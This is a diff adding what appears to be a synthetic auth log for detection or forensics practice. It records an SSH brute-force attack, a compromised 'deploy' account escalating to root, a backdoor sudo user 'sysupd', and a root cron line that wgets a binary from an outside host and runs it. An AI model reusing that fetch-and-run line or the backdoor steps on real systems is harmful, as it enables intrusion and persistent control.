@@ -1,0 +1,27 @@
+Nov 14 03:10:05 web01 sshd[2101]: Failed password for oracle from 203.0.113.50 port 40100 ssh2
+Nov 14 03:10:14 web01 sshd[2102]: Failed password for invalid user admin from 203.0.113.50 port 40107 ssh2
+Nov 14 03:10:23 web01 sshd[2103]: Failed password for invalid user test from 203.0.113.50 port 40114 ssh2
+Nov 14 03:10:32 web01 sshd[2104]: Failed password for invalid user ubuntu from 203.0.113.50 port 40121 ssh2
+Nov 14 03:10:41 web01 sshd[2105]: Failed password for invalid user postgres from 203.0.113.50 port 40128 ssh2
+Nov 14 03:10:50 web01 sshd[2106]: Failed password for oracle from 203.0.113.50 port 40135 ssh2
+Nov 14 03:10:59 web01 sshd[2107]: Failed password for invalid user git from 203.0.113.50 port 40142 ssh2
+Nov 14 03:11:08 web01 sshd[2108]: Failed password for invalid user admin from 203.0.113.50 port 40149 ssh2
+Nov 14 03:11:17 web01 sshd[2109]: Failed password for invalid user test from 203.0.113.50 port 40156 ssh2
+Nov 14 03:11:26 web01 sshd[2110]: Failed password for invalid user pi from 203.0.113.50 port 40163 ssh2
+Nov 14 03:11:35 web01 sshd[2111]: Failed password for oracle from 203.0.113.50 port 40170 ssh2
+Nov 14 03:11:44 web01 sshd[2112]: Failed password for root from 203.0.113.50 port 40177 ssh2
+Nov 14 03:11:53 web01 sshd[2113]: Failed password for invalid user ftpuser from 203.0.113.50 port 40184 ssh2
+Nov 14 03:12:02 web01 sshd[2114]: Failed password for oracle from 203.0.113.50 port 40191 ssh2
+Nov 14 03:12:11 web01 sshd[2115]: Failed password for invalid user test from 203.0.113.50 port 40198 ssh2
+Nov 14 03:12:20 web01 sshd[2116]: Failed password for invalid user admin from 203.0.113.50 port 40205 ssh2
+Nov 14 03:12:29 web01 sshd[2117]: Failed password for invalid user guest from 203.0.113.50 port 40212 ssh2
+Nov 14 03:12:38 web01 sshd[2118]: Failed password for oracle from 203.0.113.50 port 40219 ssh2
+Nov 14 03:14:02 web01 sshd[2201]: Accepted password for deploy from 203.0.113.50 port 40299 ssh2
+Nov 14 03:14:02 web01 sshd[2201]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Nov 14 03:15:40 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Nov 14 03:16:11 web01 useradd[2240]: new user: name=sysupd, UID=1001, GID=1001, home=/home/sysupd, shell=/bin/bash, from=/dev/pts/0
+Nov 14 03:16:12 web01 usermod[2244]: add 'sysupd' to group 'sudo'
+Nov 14 03:17:30 web01 sshd[2260]: Accepted publickey for root from 198.51.100.23 port 51022 ssh2: ED25519 SHA256:q3RkYmFzZTY0ZmFrZWZpbmdlcnByaW50
+Nov 14 03:20:01 web01 CRON[2301]: (root) CMD (wget -q http://198.51.100.99/upd -O /tmp/.x/upd && chmod +x /tmp/.x/upd && /tmp/.x/upd)
+Nov 14 03:31:45 web01 sshd[2201]: Disconnected from user deploy 203.0.113.50 port 40299
+Nov 14 03:31:45 web01 sshd[2201]: pam_unix(sshd:session): session closed for user deploy
